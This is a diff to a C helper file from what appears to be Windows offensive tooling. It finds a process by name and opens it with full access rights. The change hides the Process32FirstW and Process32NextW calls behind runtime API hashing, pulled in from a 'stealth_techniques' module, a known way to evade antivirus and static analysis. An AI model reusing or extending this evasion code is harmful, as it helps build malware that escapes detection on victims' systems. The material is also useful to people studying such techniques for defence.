@@ -1,4 +1,9 @@
 #include "utils.h"
+#include "../modules/stealth_techniques/api_hashing.h"
+
+// Define function pointer types for Process32FirstW and Process32NextW
+typedef BOOL (WINAPI *PProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
+typedef BOOL (WINAPI *PProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
 
 
 BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
@@ -12,7 +17,9 @@ BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hP
 // Gets the process handle of a process of name szProcessName
 BOOL GetRemoteProcessHandleWinAPI(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
 	HANDLE			hSnapShot		= NULL;
-	PROCESSENTRY32W	Proc			= { .dwSize = sizeof(PROCESSENTRY32W) };
+	PROCESSENTRY32W	Proc;
+	PPROCESSENTRY32W pProc = &Proc;
+	pProc->dwSize = sizeof(PROCESSENTRY32W);
 
 	// Takes a snapshot of the currently running processes
 
@@ -23,8 +30,15 @@ BOOL GetRemoteProcessHandleWinAPI(LPWSTR szProcessName, DWORD* dwProcessId, HAND
 		goto _EndOfFunction;
 	}
 
+	// Get Process32FirstW address using API hashing
+	PProcess32FirstW pProcess32FirstW_func = (PProcess32FirstW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), Process32FirstW_JOAA);
+	if (!pProcess32FirstW_func) {
+		DebugPrint("[!] Failed to get Process32FirstW address\n");
+		goto _EndOfFunction;
+	}
+
 	// Retrieves information about the first process encountered in the snapshot.
-	if (!Process32FirstW(hSnapShot, &Proc)) {
+	if (!pProcess32FirstW_func(hSnapShot, &Proc)) {
 		DebugPrint("[!] Process32FirstW Failed With Error : %d \n", GetLastError());
 		goto _EndOfFunction;
 	}
@@ -33,32 +47,28 @@ BOOL GetRemoteProcessHandleWinAPI(LPWSTR szProcessName, DWORD* dwProcessId, HAND
 
 		WCHAR LowerName[MAX_PATH * 2];
 
-		if (Proc.szExeFile) {
+		DWORD	dwSize = lstrlenW(pProc->szExeFile);
+		DWORD   i = 0;
 
-			DWORD	dwSize = lstrlenW(Proc.szExeFile);
-			DWORD   i = 0;
+		RtlSecureZeroMemory(LowerName, MAX_PATH * 2);
 
-			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);
+		// Converting each character in pProc->szExeFile to a lowercase character and saving it
+		// in LowerName to do the wcscmp call later
 
-			// Converting each charachter in Proc.szExeFile to a lowercase character and saving it
-			// in LowerName to do the wcscmp call later
-
-			if (dwSize < MAX_PATH * 2) {
-
-				for (; i < dwSize; i++)
-					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
-
-				LowerName[i++] = '\0';
+		if (dwSize > 0 && dwSize < MAX_PATH * 2) {
+			for (; i < dwSize; i++) {
+				LowerName[i] = (WCHAR)tolower(pProc->szExeFile[i]);
 			}
+			LowerName[i] = '\0';
 		}
 
 		// Compare the enumerated process path with what is passed
 		if (wcscmp(LowerName, szProcessName) == 0) {
 			// Save the process ID 
-			*dwProcessId	= Proc.th32ProcessID;
+			*dwProcessId	= pProc->th32ProcessID;
 			// Open a process handle and return
 
-			*hProcess		= OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
+			*hProcess		= OpenProcess(PROCESS_ALL_ACCESS, FALSE, pProc->th32ProcessID);
 
 			if (*hProcess == NULL)
 				DebugPrint("[!] OpenProcess Failed With Error : %d \n", GetLastError());
@@ -66,15 +76,31 @@ BOOL GetRemoteProcessHandleWinAPI(LPWSTR szProcessName, DWORD* dwProcessId, HAND
 			break;
 		}
 
-	// Retrieves information about the next process recorded the snapshot.
-	// while there is still a valid output ftom Process32NextW, continue looping
-	} while (Process32NextW(hSnapShot, &Proc));
-	
+		// Get Process32NextW address using API hashing (only once before the loop)
+		static PProcess32NextW pProcess32NextW_func = NULL;
+		if (!pProcess32NextW_func) {
+			pProcess32NextW_func = (PProcess32NextW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), Process32NextW_JOAA);
+			if (!pProcess32NextW_func) {
+				DebugPrint("[!] Failed to get Process32NextW address\n");
+				goto _EndOfFunction;
+			}
+		}
+
+		// Continue to next process
+		if (!pProcess32NextW_func(hSnapShot, pProc)) {
+			break;
+		}
+
+	} while (1);
+
 _EndOfFunction:
-	if (hSnapShot != NULL)
+	if (hSnapShot != NULL) {
 		CloseHandle(hSnapShot);
-	if (dwProcessId == NULL || *dwProcessId == 0 || hProcess == NULL || *hProcess == NULL)
+	}
+	
+	if (dwProcessId == NULL || *dwProcessId == 0 || hProcess == NULL || *hProcess == NULL) {
 		return FALSE;
+	}
 	return TRUE;
 }
 
